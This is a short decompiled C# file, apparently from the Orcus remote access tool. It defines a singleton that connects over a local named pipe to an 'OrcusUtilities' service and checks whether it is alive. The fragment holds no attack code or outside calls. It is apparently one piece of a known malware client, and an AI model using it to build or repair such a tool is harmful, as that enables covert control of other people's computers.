using System;
using System.ServiceModel;
using System.ServiceModel.Channels;
using Orcus.Plugins;

namespace Orcus.Service;

internal class ServiceConnection
{
	private static ServiceConnection _serviceConnection;

	public bool IsConnected { get; private set; }

	public IServicePipe Pipe { get; }

	public static ServiceConnection Current => _serviceConnection ?? (_serviceConnection = new ServiceConnection());

	private ServiceConnection()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_0043: Expected O, but got Unknown
		NetNamedPipeBinding val = new NetNamedPipeBinding();
		val.set_MaxBufferSize(1048576);
		val.set_MaxBufferPoolSize(1048576L);
		val.set_MaxReceivedMessageSize(1048576L);
		ChannelFactory<IServicePipe> val2 = new ChannelFactory<IServicePipe>((Binding)val, new EndpointAddress("net.pipe://localhost/69e001dd06a44ff1b3260a75a6f10381/OrcusUtilities"));
		try
		{
			Pipe = val2.CreateChannel();
			IsConnected = Pipe.IsAlive();
		}
		catch (Exception)
		{
			IsConnected = false;
		}
	}
}
